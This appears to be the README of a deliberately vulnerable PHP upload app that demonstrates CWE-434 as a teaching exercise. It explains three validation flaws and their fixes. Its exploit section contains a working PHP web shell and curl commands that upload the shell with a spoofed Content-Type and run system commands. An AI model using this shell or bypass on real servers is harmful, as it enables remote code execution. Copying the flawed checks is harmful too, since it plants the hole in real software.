📷 PixelNest — Insecure File Upload (CWE-434) Demo
Assigned vulnerability: CWE-434 — Unrestricted Upload of File with Dangerous Type Video demo: 🔗 [add your Google Drive link here after recording/uploading]

PixelNest is a deliberately vulnerable "upload a profile photo" web app, built to demonstrate CWE-434 end to end: a realistic three-part flaw, a working exploit that achieves remote code execution, and a fully corrected version that blocks it.

The full attack walkthrough and remediation explanation are in the linked video. This README covers what's in the repo, how the vulnerability works, and how to run both versions yourself.

Table of Contents
What the app does
Where the vulnerability lives
The attack, in short
How it's fixed
Running it locally
Reproducing the exploit
Repo structure
Disclaimer
1. What the app does (normal use)
PixelNest is a two-page app:

File	Role
public/index.php	Upload form — pick a JPG/JPEG/PNG file and submit it.
public/upload.php	Server-side handler that receives and saves the upload.
public/gallery.php	Public gallery showing every uploaded file.
Uploaded files are written into public/uploads/, which is served directly by the web server — anything placed there is reachable at http://<host>/uploads/<filename>.

2. Where the vulnerability lives
All three flaws live in public/upload.php, each marked with a [FLAW #n] comment in the code:

#	Flaw	Why it's dangerous
1	The "extension check" only tests whether an allowed substring (.jpg, .png, etc.) appears anywhere in the filename, via stripos($originalName, $goodExt) — instead of validating the file's true final extension.	A file named shell.jpg.php contains .jpg, so it passes — but its real extension is .php.
2	The "type check" trusts $_FILES['file']['type'], the Content-Type header the client sends in the upload request.	Fully attacker-controlled. Any HTTP client (curl, Burp, Postman) can label any file image/jpeg regardless of what it actually contains.
3	The file is saved under its original, attacker-supplied filename, directly inside a public, script-executable directory — no re-encoding, no content verification.	Whatever name/extension the attacker chose is exactly what lands on disk, ready to be requested and executed later.
Individually, each of these looks like a "reasonable" check — that's what makes the bug realistic. Together, they add up to one root cause: the server trusts what the filename and headers claim, instead of verifying what the file actually is.

3. The attack, in short
Attacker writes a minimal PHP web shell and names it shell.jpg.php.
Attacker uploads it through the public form — or directly via:
curl -F "file=@shell.jpg.php;type=image/jpeg" http://<host>/upload.php
spoofing the Content-Type header to image/jpeg.
The substring check sees .jpg in the name → passes. The MIME check sees the spoofed image/jpeg header → passes. The file is saved as-is: uploads/shell.jpg.php.
Attacker requests it directly:
curl "http://<host>/uploads/shell.jpg.php?cmd=whoami"
Because the file's real extension is .php and the uploads folder executes PHP, the server runs the attacker's code and returns the output — full remote code execution from an "image upload" form.
Note: none of this requires the attacker to have any access to this repo, this server's filesystem, or its source code. The entire attack surface is the public upload URL — every step above works identically against a real domain name in place of <host>.

(Full live demo of this is in the video.)

4. How it's fixed
See secure-version/ — a complete, runnable copy of the app. upload.php there carries short ERROR: / FIX: comments marking exactly what was wrong and how each flaw was closed, plus uploads/.htaccess for directory hardening.

Fix	What it does
Validate real content, not the name	getimagesize() reads the actual file bytes. A PHP script fails this check no matter what it's named or what Content-Type was sent.
Never trust the original filename	The server generates a random filename and appends only the verified extension — the attacker's chosen name/extension never touches disk.
Re-encode the image	Re-saving via GD strips any payload appended after a valid image header.
Disable execution in the uploads folder	uploads/.htaccess turns off the PHP engine for that directory — defense in depth, even if a bad file ever landed there.
Extra hardening (recommended in production)	Enforce a max file size (already 5MB here), store uploads outside the web root where possible, run uploads through malware/content scanning, and serve them back with Content-Disposition: attachment and X-Content-Type-Options: nosniff.
5. Running it locally
Requires PHP 8.x.

cd public
php -S 127.0.0.1:8000
Then open http://127.0.0.1:8000/index.php.

To run the secure version alongside it (useful for comparing behavior side by side), start a second server on a different port in another terminal:

cd secure-version
php -S 127.0.0.1:8001
Then open http://127.0.0.1:8001/index.php.

6. Reproducing the exploit
macOS / Linux
# 1. Create a tiny PHP web shell disguised with a double extension
cat > shell.jpg.php << 'EOF'
<?php if (isset($_GET['cmd'])) { system($_GET['cmd']); } ?>
EOF

# 2. Upload it, spoofing the Content-Type like a browser/attacker tool would
curl -F "file=@shell.jpg.php;type=image/jpeg" http://127.0.0.1:8000/upload.php

# 3. Trigger it directly
curl "http://127.0.0.1:8000/uploads/shell.jpg.php?cmd=id"
Windows (PowerShell)
PowerShell aliases curl to Invoke-WebRequest, which doesn't support -F. Remove the alias first so curl resolves to the real curl.exe:

Remove-Item alias:curl -ErrorAction SilentlyContinue

# 1. Create the disguised PHP web shell
Set-Content -Path shell.jpg.php -Value '<?php if (isset($_GET[''cmd''])) { system($_GET[''cmd'']); } ?>'

# 2. Upload it, spoofing the Content-Type
curl -F "file=@shell.jpg.php;type=image/jpeg" http://127.0.0.1:8000/upload.php

# 3. Trigger it directly (Windows has no `id` command — use `whoami` or `dir`)
curl "http://127.0.0.1:8000/uploads/shell.jpg.php?cmd=whoami"
curl "http://127.0.0.1:8000/uploads/shell.jpg.php?cmd=dir"
Confirming the fix
Run the same three steps against port 8001 instead of 8000. The upload will be rejected with Not a valid JPG/PNG image., and the follow-up request for the file will return 404 Not Found — it was never written to disk.

7. Repo structure
insecure-upload-demo/
├── README.md
├── public/                        ← the vulnerable app (what you run)
│   ├── index.php
│   ├── upload.php                 ← the vulnerable code (see [FLAW #1..3] comments)
│   ├── gallery.php
│   ├── style.css
│   └── uploads/                   ← where uploaded files land (web-accessible)
└── secure-version/                ← fixed, runnable copy of the whole app
    ├── index.php
    ├── upload.php                 ← ERROR/FIX comments mark each corrected flaw
    ├── gallery.php
    ├── style.css
    └── uploads/
        └── .htaccess              ← disables script execution in this folder










